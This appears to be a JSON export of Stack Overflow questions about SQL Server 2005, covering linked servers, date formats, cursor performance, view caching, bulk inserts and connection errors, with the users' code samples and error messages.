message","body":"<p>I am trying to run profiler and get it to log to a database. The profiler starts to run and then after few hours (yes few hours, I know its bad!!) the profiler stops with the message. </p>\n\n<pre><code>Failed to save trace data to table\n</code></pre>\n\n<p>When I look at the logs, I can only find: </p>\n\n<pre><code>SQL Trace stopped. Trace ID = '2'. Login Name = 'sa'.\n</code></pre>\n\n<p>There are no other error messages. Any ideas why this might be happening?</p>\n"},{"tags":["sql-server","oracle","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":124,"score":0,"question_id":11235249,"title":"Cannot link SQL Server to Oracle","body":"<p>hopefully someone is able to shed some light on this annoying problem I ran into today.</p>\n\n<p>Environment: MSSQL 2005 on Windows Server Enterprise 2008 SP2 64-bit.</p>\n\n<p>Issue: I have installed the Oracle Client and ODAC (both 64-bit), but do not see OraOLEDB as a provider when I go to Server Objects -> Linked Servers -> Providers. I can tnsping the remote Oracle server and log in via SQL Plus, so the client is properly installed. But SQL Server is unable to see it.</p>\n\n<p>I did install ODAC without the Oracle Client at first, then uninstalled it using the Oracle Universal Installer. When I then attempted to install the Oracle Client into the same ora_home location it reported an Oracle Client was already installed at that location. So I now have \"two\" ora_homes, client_1 and client_2. The directory for client_1 is empty, all Oracle components are installed into client_2 in the \"correct\" order (Oracle Client, then ODAC).</p>\n\n<p>I tried setting up the linked server using the \"Microsoft OLE DB Provider for Oracle\" to no avail. When I attempt to query the remote server with this setup I get the following error:</p>\n\n<blockquote>\n  <p>OLE DB provider \"MSDAORA\" for linked server \"STARS\" returned message\n  \"Oracle client and networking components were not found. These\n  components are supplied by Oracle Corporation and are part of the\n  Oracle Version 7.3.3 or later client software installation.</p>\n  \n  <p>Provider is unable to function until these components are installed.\".</p>\n</blockquote>\n\n<p>So now I'm stumped. Every tutorial I found online goes from install Oracle Client to install ODAC to configure the OraOLEDB provider without reference to any \"hiccups\" along the way, and I haven't found anyone who simply doesn't see the provider at all.</p>\n\n<p>Thanks in advance.</p>\n\n<p><strong>Update</strong></p>\n\n<p>I should clarify, <a href=\"http://www.ideaexcursion.com/2009/01/05/connecting-to-oracle-from-sql-server/\" rel=\"nofollow\">this article</a> is what I was primarily using. I read a few others as well and they all seemed to have the same basic sequence. Also updated the title to hopefully make it more clear. Thanks again for any advice.</p>\n"},{"tags":["sql-server","sql-server-2005","view"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2000,"score":2,"question_id":373093,"title":"SQL Server View showing outdated / wrong data after changing underlying dependencies","body":"<p>We have a View (call it X) that is the base view called by 2 other views(call them Y and Z). </p>\n\n<p>Today we made a change to view X, after that view Y and Z started bringing back data that was incorrect. When we were in Management Studio and ran <code>Select * from Y</code>(which is exactly how the view is called in in code) it would get back data that was incorrect. However, when we ran the actual SQL that the view contained it was fine. We tried a number of things until a colleague suggested adding a space to view X and Z and then running Alter, which worked. Everything returned to normal and ran fine. </p>\n\n<p>My question is: Does MSSQL cache its views? and if so how do you force them not to OR force them to re-compile?</p>\n\n<p>Also, any additional reading about this would be helpful.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":268,"score":0,"question_id":11226153,"title":"Oracle equivalent ROWNUM for SQL-Server 2005?","body":"<p>In Oracle PL/SQL I was used to write:</p>\n\n<pre><code>SELECT * FROM MY_TABLE WHERE ROWNUM &lt;= 100;\n</code></pre>\n\n<p>in order to fetch only the first 100 records of the table named MY_TABLE.</p>\n\n<p>What could be the equivalent SELECT statement in SQL SERVER?</p>\n"},{"tags":["sql-server-2005","bulkinsert"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":11228347,"title":"bulk insert with format file sql server 2005","body":"<p>I would like to create a stored procedure that imports a txt file into an existing table using a format file and also update certain fields that will be null in the import. The import file will just update one column and I need to manually assign values for the other columns.</p>\n\n<pre><code>bulk insert QueryData from 'E:\\TrackInputLogs\\NMSLog.txt'\nwith(FORMATFILE = 'E:\\TrackInputLogs\\NMSFormat.fmt', \nROWTERMINATOR='\\n') \n</code></pre>\n\n<p>I need to update the following columns as follows at the same time</p>\n\n<pre><code>dateimported = getdate()\nidkey = asdfg\nimportmethod = manual\n</code></pre>\n\n<p>oh by the way, this is an existing table and I do not want to delete current contents but also the import will update the fields where the idkey matches the values associated with the file contents.</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":11232723,"title":"How do I properly configure SQL Server Management Studio 2008 to work with SQL Server 2005 DB?","body":"<p>How do I properly configure SQL Server Management Studio 2008 to work with SQL Server 2005 DB?  The reason I'm asking is because I'm having trouble with and unable to use Integration Services.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","max"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":251,"score":0,"question_id":10981759,"title":"Select Max Date in Year Month Day Format","body":"<p>I have a table that I drew the following sample from:</p>\n\n<pre><code>Item    &lt;other columns&gt; year month day\n----    -- ------------ ---- ----- ---\nVX4O    GL 630.5938     2012 7     20\nBX2T    GL 0            2012 7     13\nMWB806I GL 92004.72     2012 6     15\n4XU     GL 17.125       2012 7     20\nVL4O    GL 130.5        2012 7     20\nMWB806I GL 92004        2012 10    26\nMWB806I GL 92005        2012 11    30\n3PU     GL 25           2012 7     20\nVC4O    GL 630.6094     2012 7     20\nMWB806I GL 92005        2012 11    2\n</code></pre>\n\n<p>The first column is Item, the last three columns are year, month, day.</p>\n\n<p>How do I select the max date per item?</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures","locking"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":252,"score":0,"question_id":9388473,"title":"How to mitigate locking in stored procedure that queries cross-database view","body":"<p>I have a view that joins SQL Server tables on linked servers. There are certain restrictions on linked servers that mean I can't create an index on the view and there is a stored procedure that last night locked the database, even though it is only doing a select. The stored procedure is generated by <a href=\"http://nettiers.com/Home.ashx\" rel=\"nofollow\">.NetTiers</a> (I've elided a dozen columns from both select statements):</p>\n\n<pre><code>CREATE PROCEDURE [AbnormalReadingSource_Get]\n(\n    @WhereClause varchar (2000)  ,\n    @OrderBy varchar (2000)  ,\n    @PageIndex int   ,\n    @PageSize int   \n)\nAS\nSET TRANSACTION ISOLATION LEVEL READ COMMITTED\nBEGIN\n    DECLARE @PageLowerBound int\n    DECLARE @PageUpperBound int\n\n    -- Set the page bounds\n    SET @PageLowerBound = @PageSize * @PageIndex\n    SET @PageUpperBound = @PageLowerBound + @PageSize\n\n    IF (@OrderBy is null or LEN(@OrderBy) &lt; 1)\n    BEGIN\n        -- default order by to first column\n        SET @OrderBy = '[Result]'\n    END\n\n    -- SQL Server 2005 Paging\n    declare @SQL as nvarchar(4000)\n    SET @SQL = 'WITH PageIndex AS ('\n    SET @SQL = @SQL + ' SELECT'\n    IF @PageSize &gt; 0\n    BEGIN\n        SET @SQL = @SQL + ' TOP ' + convert(nvarchar, @PageUpperBound)\n    END\n    SET @SQL = @SQL + ' ROW_NUMBER() OVER (ORDER BY ' + @OrderBy + ') as RowIndex'\n    SET @SQL = @SQL + ', [Result]'\n    SET @SQL = @SQL + ' FROM [AbnormalReadingSource]'\n    IF LEN(@WhereClause) &gt; 0\n    BEGIN\n        SET @SQL = @SQL + ' WHERE ' + @WhereClause\n    END\n    SET @SQL = @SQL + ' ) SELECT'\n    SET @SQL = @SQL + ' [Result],'\n    SET @SQL = @SQL + ' FROM PageIndex'\n    SET @SQL = @SQL + ' WHERE RowIndex &gt; ' + convert(nvarchar, @PageLowerBound)\n    IF @PageSize &gt; 0\n    BEGIN\n        SET @SQL = @SQL + ' AND RowIndex &lt;= ' + convert(nvarchar, @PageUpperBound)\n    END\n    exec sp_executesql @SQL\n\n    -- get row count\n    SET @SQL = 'SELECT COUNT(*) as TotalRowCount'\n    SET @SQL = @SQL + ' FROM [AbnormalReadingSource]'\n    IF LEN(@WhereClause) &gt; 0\n    BEGIN\n        SET @SQL = @SQL + ' WHERE ' + @WhereClause\n    END\n    exec sp_executesql @SQL\n\nEND\n</code></pre>\n\n<p>The database transaction isolation level is <code>READ COMMITTED</code> so setting the isolation level in the stored procedure isn't necessary but is in the .NetTiers templates used to generate the stored procedure. Can I use the <em>readpast</em> hint to avoid the locking that occurred? Do I need to provide any other hints when using <em>readpast</em>?</p>\n"},{"tags":["sql-server-2005","oracle","datetime","ssis"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":449,"score":1,"question_id":4610330,"title":"Oracle to SQL2005 DATETIME field overflows in SSIS","body":"<p>I'm importing data from Oracle to SQL Server 2005 using SSIS. I think the datetime fields in Oracle are stored to a higher precision than SQL Server 2005 \"DATETIME\" fields will allow, causing overflow errors. What's the best practice for getting the table in?</p>\n\n<p>These tables have lots of datetime fields, and there are lots of tables, so it'd be awesome if there wasn't a ton of manual work for each field...</p>\n\n<p>I've read <a href=\"http://stackoverflow.com/questions/2231028/dealing-with-timestamp-datetime-when-copying-data-from-oracle-to-sql-server-using\" title=\"this post\">http://stackoverflow.com/questions/2231028/dealing-with-timestamp-datetime-when-copying-data-from-oracle-to-sql-server-using</a> and that could work, but I'd have to do that for each field, for every table, and I'd rather have a universal setting or process...</p>\n\n<p>Any ideas?</p>\n\n<p>Thanks,</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":123,"score":1,"question_id":10994980,"title":"How to Find Current Month and Year From Custom Date range?","body":"<p>I have a problem about custom date range. let me explain it, for our company month count from current month day 21 to next month day 20. if i want to know which employee join current month then normally i can find using sql</p>\n\n<pre><code>SELECT *\n  FROM tblEmployeeMaster\n  --CURRENT MONTH\n  WHERE MONTH(DateOfJoining)=MONTH(GETDATE())  AND YEAR(DateOfJoining)=YEAR(GETDATE())\n</code></pre>\n\n<p>but for this custom date range i can not find employee who are join in this month. For example in this system if i want to find list of employee joined in this month then result will be show that employee who join in previous month  after day 21 to current month day 20. Could someone please help me?</p>\n"},{"tags":["sql-server-2005","hibernate","varchar","nvarchar"],"answer_count":3,"favorite_count":4,"up_vote_count":5,"down_vote_count":0,"view_count":7558,"score":5,"question_id":1099413,"title":"How can Hibernate map the SQL data-type nvarchar(max)?","body":"<p>I have a column in my SQL-2005 database that used to be a <strong><em>varchar(max)</em></strong>, but it has been changed to an <strong><em>nvarchar(max)</em></strong>.</p>\n\n<p>Now I need to update my hibernate mapping file to reflect the change, and this is what it used to be:</p>\n\n<blockquote>\n  <p>&lt;element type=\"text\" column=\"Value\"/&gt;</p>\n</blockquote>\n\n<p>When I try to run the application, the following error appears:</p>\n\n<blockquote>\n  <p>org.hibernate.HibernateException: Wrong column type in [Table] for column Value. Found: ntext, expected: text</p>\n</blockquote>\n\n<p>What should I put in the 'type' attribute to correctly map the column as an <strong><em>nvarchar(max)</em></strong>?</p>\n\n<p>I've tried setting the type to <em>ntext</em>, but hibernate didn't know what that was. I tried setting the type to <em>string</em>, but it treated <em>string</em> as a <em>text</em> type.</p>\n"},{"tags":["php","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":130,"score":0,"question_id":11224315,"title":"PHP - mssql connect through terminal but faild in web","body":"<p>im using this script to test my connection from  linux server to mssql engine , my issue is when i apply<br>\n[root@localhost html]# php sql.php \nYou are connected to the new database on the mssql.</p>\n\n<p>Now when i access sql.php from web its give me error \"Warning: mssql_connect(): Unable to connect to server: \"</p>\n\n<p>Any clue whats realy happing and why i cant connect through web ,  both server in same local network firewall is off </p>\n\n<pre><code>?php\n\n$myServer = \"mssql\"; // host/instance_name\n$myUser = \"sa\"; // username\n$myPass = \"mypasswd\"; // paasword\n$myDB = \"new\"; // database name\n\n // connection to the database\n$dbhandle = mssql_connect($myServer, $myUser, $myPass)\n or die(\"Couldnt connect to SQL Server on $myServer\");\n\n// select a database to work with\n $selected = mssql_select_db($myDB, $dbhandle)\n or die(\"Couldn.t open database $myDB\");\n\n    echo \"You are connected to the \" . $myDB . \" database on the \" . $myServer . \".\";\n\n      // close the connection\n        mssql_close($dbhandle);\n     ?&gt;\n</code></pre>\n"},{"tags":["sql-server-2005","null","computed-columns","isnull"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":856,"score":1,"question_id":1854346,"title":"Computed bit column that returns whether another column is null","body":"<p>I try to have this computed column:</p>\n\n<pre><code>CREATE TABLE dbo.Item\n(\n    ItemId int NOT NULL IDENTITY (1, 1),\n    SpecialItemId int NULL,\n    --I tried this\n    IsSpecialItem AS ISNULL(SpecialItemId, 0) &gt; 0, \n    --I tried this\n    IsSpecialItem AS SpecialItemId IS NOT NULL\n    --Both don't work\n)  ON [PRIMARY]\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","datetime","date-formatting"],"answer_count":7,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":2886,"score":7,"question_id":1187127,"title":"SQL Server Datetime issues. American vs. British?","body":"<p>On my test DB, the dates are displayed in a DD/MM/YYYY format. By displayed I mean when you right click, open table in Management Studio, the returned data are displayed in a DD/MM/YYYY format.</p>\n\n<p>Funny thing is, when I write T-SQL to retrieve records, I have to input a MM/DD/YYYY format to get back the right data. Is there anyway I can align this to a DD/MM/YYYY format?</p>\n"},{"tags":["sql-server-2005","odbc","windows-server-2008","dsn"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":11202499,"title":"Windows 2008 - system dsn accessible only to administrators","body":"<p>ODBC </p>\n\n<p>I have set up a 32-bit ODBC System DSN for sql driver using c:\\Windows\\SysWOW64\\odbcad32.exe tool on a Windows 2008 64-bit server. </p>\n\n<p>The dsn is under registry path HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\ODBC\\ODBC.INI</p>\n\n<p>The issue is that the system DSN is only accessible to users who are Administrators on the server. Is there any access rights setting to be done?</p>\n\n<p>Thanks,</p>\n\n<p>Afzal</p>\n"},{"tags":["sql-server-2005","date-format"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":195,"score":0,"question_id":11220023,"title":"How to change the language and date format in SQL Server?","body":"<p>I am using SQL Server 2005. When I execute <code>DBCC USEROPTIONS</code>, I see the language as romana and dateformat as <code>dmy</code>. </p>\n\n<p>I want the language to be <code>us_english</code> and dateformat as <code>mdy</code>. </p>\n\n<p>How can I do this? I was having these settings initially but somehow they got changed to romana. </p>\n\n<p>How to revert back to <code>us_english</code> and date as <code>dmy</code>?</p>\n"},{"tags":["sql-server-2005","date-format"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":217,"score":0,"question_id":11219841,"title":"How to set dateformat to mdy in SQL Server 2005?","body":"<p>I am using SQL Server 2005. When I execute <code>SET DATEFORMAT mdy</code>, it just the date format for that specific session. When I disconnect from Management Studio and connect back it does not take that format.</p>\n\n<p>But I want to set it permanently. How can I do it? </p>\n"},{"tags":["query","sql-server-2005","batch-file"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":113,"score":2,"question_id":11218363,"title":"SQL Server query with batch script","body":"<p>I need to exec this sql query on my Windows SQL Server 2005, can i do this with a batch script?</p>\n\n<p>The sql query</p>\n\n<pre><code>UPDATE VI_CURR_INFO SET \n    ends_days = '2005', \n    check_code = '1', \n    memb_name = '123132', \n    memb_guid = '1', \n    sno__numb = '1', \n    Bill_Section = '6', \n    Bill_Value = '3', \n    Bill_Hour = '6', \n    Surplus_Point = '6', \n    Increase_Days = '0' \n</code></pre>\n\n<p>The database name is \"test1\". \nHow to perform a batch script to do that?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":11215796,"title":"how to compare money in sql server","body":"<p>I need use case condition in sql server, the datatype is money, the condition is money>= 100, here is my code:</p>\n\n<pre><code> insert into table1 \n(  Col1,\n   Col2,\n   Col3\n) \n\nselect \n ColA,\n ColB,\n case ColC when ColC &gt;=100 then 'Y' else 'N' end\n</code></pre>\n\n<p>I got an error: Incorrect syntax near '>'. How do I compare money in sql? Thanks for your help.   </p>\n"},{"tags":["sql","sql-server-2008","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":11213161,"title":"Order by birthday, disregarding year","body":"<p>How do you make a query where you ORDER BY birthday disregarding the year altogether. I need to eliminate/disregard the year and ORDER BY birthdate month and birthdate day from today's date in either ASC or DESC.</p>\n\n<p>The below won't work because the years of the birthdate come into play. The below example shows what happens when the year is regarded:</p>\n\n<pre><code>John   01/02/1974\nBilly  11/15/2000\nAlly   06/25/2008\n\nSELECT * FROM users ORDER BY birthdate\n</code></pre>\n\n<p>Expected results when ordering by birthday:</p>\n\n<pre><code>John   01/02/1974\nAlly   06/25/2008\nBilly  11/15/2000\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":11209957,"title":"Update of column happens even though I don't want it to happen","body":"<p>I've got a case statement:</p>\n\n<pre><code>UPDATE\n   Answer\nSET\n   AnswerID = @AnswerID,\n   AnsweredBy = CASE WHEN LEN(@AnsweredBy) &gt; 0 THEN @AnsweredBy END\n</code></pre>\n\n<p>Even when <code>@AnsweredBy</code> is <code>NULL</code> it still sets the <code>AnsweredBy</code> column to null.</p>\n\n<p>I've tried to test for null as well by doing this:</p>\n\n<pre><code> UPDATE\n    Answer\n SET\n    AnswerID = @AnswerID,\n    AnsweredBy = CASE WHEN @AnsweredBy IS NOT NULL THEN @AnsweredBy END\n</code></pre>\n\n<p>Meaning I do not want to update the <code>answeredby</code> column unless there is a value.</p>\n\n<p>Even in my C# code I do not pass a value to my stored procedure:</p>\n\n<pre><code>if (answeredBy.Length &gt; 0)\n   cmdSelect.Parameters.Add(\"@AnsweredBy\", SqlDbType.VarChar).Value = answeredBy;\n</code></pre>\n\n<p>unless there is a value. And in my sproc I default that column variable to null:</p>\n\n<pre><code>@RunoffAnswerID bigint,\n@AnswerID varchar(3)=NULL,\n@AnsweredBy varchar(50)=NULL,\n</code></pre>\n\n<p>So my question is how do I perform the rest of my updates, because there are about 5-10 more columns but only update the <code>answeredby</code> if there is a value in <code>@AnsweredBy</code>?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":504,"score":0,"question_id":11208715,"title":"How to Calculate datediff between two date in year, month & days?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/57599/how-to-calculate-age-in-t-sql-with-years-months-and-days\">How to calculate age in T-SQL with years, months, and days</a>  </p>\n</blockquote>\n\n\n\n<p>I have an application which calculates age on the specific date completely that is in years-months-days . Is there any simple way to calculate this in sql server 2005 . Actually I have created a function for this but that quite complex . I just want to know is there any simple way or any functionality in sql server from which I am not aware of?</p>\n\n<p>The requirement is quite simple to calculate the exact age on the specific date for any applicant.</p>\n"},{"tags":["sql","tsql","sql-server-2005","cursor","duplicate-removal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":162,"score":-2,"question_id":11055754,"title":"How to make a cursor faster","body":"<p>I have wrote this cursor for commission report. What happens is commission comes in one table, the records are another table. I match two based on certain critera (there is not exact match available). The problem is there are duplicates where records exist. When I match commission with the <code>records</code> table, it can result picking up these duplicates. Thus the rep gets paid more. On the other hand, there are duplicates in commission table also but those are valid beause they simple mean an account got paid for 2 months.</p>\n\n<p>I wrote this query but it takes 5+ minutes to run. I have 50,000 records in records table and 100,000 in commission table. Is there any way I an improve this cursor?</p>\n\n<pre><code>/* just preparation of cursor, this is not time consuming */\nCREATE TABLE #result\n  (\n     repid         INT,\n     AccountNo     VARCHAR(100),\n     supplier      VARCHAR(15),\n     CompanyName   VARCHAR(200),\n     StartDate     DATETIME,\n     EndDate       DATETIME,\n     Product       VARCHAR(25),\n     commodity     VARCHAR(25),\n     ContractEnd   DATETIME,\n     EstUsage      INT,\n     EnrollStatus  VARCHAR(10),\n     EnrollDate    DATETIME,\n     ActualEndDate DATETIME,\n     MeterStart    DATETIME,\n     MeterEnd      DATETIME,\n     ActualUsage   INT\n  )\n\nDECLARE @AccountNo VARCHAR(100)\nDECLARE @supplier VARCHAR(10)\nDECLARE @commodity VARCHAR(15)\nDECLARE @meterstart DATETIME\nDECLARE @meterEnd DATETIME\nDECLARE @volume FLOAT\nDECLARE @RepID INT\nDECLARE @Month INT\nDECLARE @Year INT\n\nSET @repID = 80\nSET @Month = 1\nSET @year = 2012\n\n/* the actual cursor */\nDECLARE commission_cursor CURSOR FOR\n  SELECT AccountNo,\n         supplier,\n         commodity,\n         meterStart,\n         MeterEnd,\n         Volume\n  FROM   commission\n  WHERE  Datepart(m, PaymentDate) = @Month\n         AND Datepart(YYYY, PaymentDate) = @Year\n\nOPEN commission_cursor\n\nFETCH next FROM commission_cursor INTO @AccountNo, @supplier, @commodity, @MeterStart, @MeterEnd, @Volume;\n\nWHILE @@fetch_status = 0\n  BEGIN\n      IF EXISTS (SELECT id\n                 FROM   Records\n                 WHERE  AccountNo = @AccountNo\n                        AND supplier = @supplier\n                        AND Commodity = @commodity\n                        AND RepID = @repID)\n        INSERT INTO #result\n        SELECT TOP 1 RepID,\n                     AccountNo,\n                     Supplier,\n                     CompanyName,\n                     [Supplier Start Date],\n                     [Supplier End Date],\n                     Product,\n                     Commodity,\n                     [customer end date],\n                     [Expected Usage],\n                     EnrollStatus,\n                     ActualStartDate,\n                     ActualEndDate,\n                     @meterstart,\n                     @MeterEnd,\n                     @volume\n        FROM   Records\n        WHERE  AccountNo = @AccountNo\n               AND supplier = @supplier\n               AND Commodity = @commodity\n               AND RepID = @repID\n               AND @MeterStart &gt;= Dateadd(dd, -7, ActualStartDate)\n               AND @meterEnd &lt;= Isnull(Dateadd(dd, 30, ActualEndDate), '2015-12-31')\n\n      FETCH next FROM commission_cursor INTO @AccountNo, @supplier, @commodity, @MeterStart, @MeterEnd, @Volume;\n  END\n\nSELECT *\nFROM   #result\n\n/* clean up */\nCLOSE commission_cursor\n\nDEALLOCATE commission_cursor\n\nDROP TABLE #result \n</code></pre>\n\n<p>I have read answer to <a href=\"http://stackoverflow.com/questions/859407/how-to-make-a-t-sql-cursor-faster\">How to make a T-SQL Cursor faster?</a>, for that what I get is rewrite this query in table form. But I do have another query which uses join and is lightening fast. The problem is, it can not differentiate between the dups in my <code>records</code> table.</p>\n\n<p>Is there anything I can do to make is faster. This is primary question. If not, do you have any alternative way to do it.</p>\n\n<p>I specifically need help with</p>\n\n<ul>\n<li>Will using Views or store procedure help</li>\n<li>I there a way I can use cache in Cursor to make it faster</li>\n<li>Any other option in syntax</li>\n</ul>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":50,"score":-2,"question_id":11207746,"title":"Datetime Format in Sql server","body":"<p>I have field in sql table DateIn, in table date exists like '01/04/2012 00:00:00'. when i run query on query analyzer DateIn comes like '2012-04-01 00:00:00.000' i am passing date from text box like 'dd/mm/yyyy' format but not working. I have function where i am passing date variable Dim StrDate as DateTime from text box to query. Please guide me.</p>\n"},{"tags":["sql-server-2005","db2","linked-server","ibm-midrange"],"answer_count":6,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":5630,"score":2,"question_id":329051,"title":"Execute DB2 iSeries Stored Procedure from a SQL 2005 Linked Server","body":"<p>I am trying to execute a stored procedured from a linked database in MS SQL 2005.  The linked database is a db2 database on a iseries server.  I am using the iSeries IBMDASQL service provider.  I am able to query the stored procedure without problems using a simple vbscript and ado.  When I try to execute the same stored procedure in query analyzer on the SQL Server, I never see any results.  Query analyzer always show 'command executed' and when I execute the select * on the temp table, no values appear.  What am I doing wrong?????\nThanks!</p>\n\n<p>--code from query analyzer below--</p>\n\n<pre><code>DECLARE @emailToAddress     \tchar(50)\nDECLARE @emailFromAddress   \tchar(50)\n\nset @emailToAddress = 'customer.service@company.com'\nset @emailFromAddress = 'customer@gmail.com'\n\nIf Object_ID('tempdb..#tmpResultTbl') Is Not Null\n    Drop Table #tmpResultTbl\n\nCreate Table #tmpResultTbl\n(\nOUTPGMID Char(150))\n\n--SET FMTONLY Off\nSet NoCount On\nInsert Into #tmpResultTbl \nEXEC ('CALL abicqual.VP_GETCCEPGMID(?, ?) ', @emailToAddress, @emailFromAddress) AT MAM400 \n\nSelect * From #tmpResultTbl\n</code></pre>\n\n<p>UPDATED:\nHere is the updated code to use openquery... still no luck :(</p>\n\n<p>DECLARE @TSQL varchar(8000)\nDECLARE @emailToAddress     \tvarchar(50)\nDECLARE @emailFromAddress   \tvarchar(50)\nSET @emailToAddress = 'customer.service@company.com'\nSET @emailFromAddress = 'customer@gmail.com'\nSET @TSQL = 'SELECT * FROM OPENQUERY(MAM400,''CALL abicqual.VP_GETCCEPGMID(''''' + @emailToAddress + ''''', ''''' + @emailFromAddress + '''''' + ')''' + ')'\nPrint @TSQL\nEXEC (@TSQL)</p>\n\n<p>--output below--\nSELECT * FROM OPENQUERY(MAM400,'CALL abicqual.VP_GETCCEPGMID(''customer.service@company.com'', ''customer@gmail.com'')')\nMsg 7357, Level 16, State 2, Line 1\nCannot process the object \"CALL abicqual.VP_GETCCEPGMID('customer.service@company.com', 'customer@gmail.com')\". The OLE DB provider \"IBMDASQL\" for linked server \"MAM400\" indicates that either the object has no columns or the current user does not have permissions on that object.</p>\n"},{"tags":["asp.net","database","vb.net","sql-server-2005","aspnetdb"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6522,"score":0,"question_id":4737948,"title":"A network-related or instance-specific error occurred while establishing a connection to SQL Server","body":"<p>I HOST MY ASP.NET WEBSITE ON WEBSERVER ..But after upload when i try to access my site ...</p>\n\n<p><a href=\"http://www.vbi.volvobusesindia.com\" rel=\"nofollow\">http://www.vbi.volvobusesindia.com</a></p>\n\n<p>Then following error occurs .... </p>\n\n<blockquote>\n  <p>A network-related or instance-specific\n  error occurred while establishing a\n  connection to SQL Server. The server\n  was not found or was not accessible.\n  Verify that the instance name is\n  correct and that SQL Server is\n  configured to allow remote\n  connections. (provider: SQL Network\n  Interfaces, error: 26 - Error Locating\n  Server/Instance Specified)</p>\n</blockquote>\n\n<p>i have changed my connectionstring in web.config file and all webpages to : </p>\n\n<pre><code>&lt;connectionStrings&gt;\n    &lt;remove name=\"ConnectionString\"/&gt;\n    &lt;add name=\"ConnectionString\" connectionString=\"Data Source=69.16.253.19,1433; Network Library=DBMSSOCN; Initial Catalog=database;Persist Security Info=True;User ID=username;Password=password\" providerName=\"System.Data.SqlClient\"/&gt;\n  &lt;/connectionStrings&gt;\n</code></pre>\n\n<p>...before publishing and uploading my website to webserver ...</p>\n\n<p><em><strong>I m confused the problem is from my local computer or the webserver ....and how to fix this error ?</em></strong></p>\n"},{"tags":["sql-server","sql-server-2005","persian"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":164,"score":1,"question_id":11205509,"title":"Persian numbers in SQL Server 2005","body":"<p>I'm trying to add some persian text to my SQL Server 2005 database.</p>\n\n<p>There is no problem with letters, but persian numbers (<code>...</code>) are converted to <code>?</code>...</p>\n\n<p>For example, if I add this text (<code> </code>) to database, there will be (<code> </code>) in database/</p>\n\n<p>What should I do? (for example, which collation should I use?)</p>\n\n<p>I'm using <code>Arabic_CI_AS</code> collation. in <a href=\"http://www.serverintellect.com/support/sqlserver/change-database-collation.aspx\" rel=\"nofollow\">this</a> list, Farsi (Persian) collation is <code>Arabic_CI_AS</code>\n(SQL Server 2005 doesn't have <code>Persian</code> collation, but 2008 has!)</p>\n\n<p>Note: I can't use newer versions of SQL Server...</p>\n"},{"tags":["tsql","sql-server-2005","insert-update"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":41,"score":0,"question_id":11198937,"title":"Cascade new IDs to a second, related table","body":"<p>I have two tables, Contacts and Contacts_Detail. I am importing records into the Contacts table and need to run a SP to create a record in the Contacts_Detail table for each new record in the Contacts. There is an ID in the Contacts table and a matching ID_D in the Contacts_Detail table. </p>\n\n<p>I'm using this to insert the record into Contacts_Detail but get the 'Subquery returned more than 1 value.' error and I can't figure out why. There are multiple records in Contacts that need have matching records in Contacts_Detail. </p>\n\n<pre><code>  Insert into Contacts_Detail (ID_D)\n\n  select id from Contacts c\n  left join Contacts_Detail cd\n  on c.id = cd.id_d\n  where id_d is null\n</code></pre>\n\n<p>I'm open to a better way... \nthanks. </p>\n"},{"tags":["sql-server","sql-server-2005","full-text-search","fulltext","full-text-indexing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":11141186,"title":"How to ignore noiseXXX.txt files for a specific column in SQL Server 2005?","body":"<p>I have a product table where the description column is fulltext indexed.</p>\n\n<p>The problem is, users frequently search a single word, which happens to be in the noiseXXX.txt files.</p>\n\n<p>We'd like to keep the noise word functionality enabled, but is there anyway to turn it off just for this one column?</p>\n\n<p>I think you can do this in <a href=\"http://msdn.microsoft.com/en-us/library/ms188359.aspx\" rel=\"nofollow\">2008 with the SET STOPLIST=OFF</a>, but I can't seem to find similar functionality in <a 